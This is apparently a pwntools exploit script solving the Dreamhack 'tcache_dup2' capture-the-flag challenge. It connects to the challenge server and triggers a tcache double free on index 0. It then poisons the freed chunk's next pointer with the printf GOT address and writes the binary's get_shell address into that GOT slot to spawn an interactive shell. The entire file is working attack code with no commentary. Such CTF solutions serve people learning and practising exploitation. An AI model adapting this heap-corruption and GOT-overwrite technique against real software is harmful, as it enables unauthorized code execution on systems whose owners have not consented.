#!/usr/bin/python 
from pwn import *

context.log_level = 'debug'
p = remote("host1.dreamhack.games", 8526)
#p = process("./tcache_dup2")
elf = ELF("./tcache_dup2")
get_shell = elf.symbols['get_shell']

def Create(size, data):
    p.sendlineafter("> ", '1')
    p.sendlineafter("Size: ", str(size))
    p.sendlineafter("Data: ", str(data))

def Modify(idx, size, data):
    p.sendlineafter("> ", '2')
    p.sendlineafter("idx: ", str(idx))
    p.sendlineafter("Size: ", str(size))
    p.sendlineafter("Data: ", str(data))

def Delete(idx):
    p.sendlineafter("> ", '3')
    p.sendlineafter("idx: ", str(idx))


Create(9, 'A'*8)
Create(9, 'A'*8)

Delete(0)
Delete(0)


Modify(0, 9, p64(elf.got['printf']))
Create(9, 'B'*8)
Create(9, p64(get_shell))

#gdb.attach(p)

p.interactive()
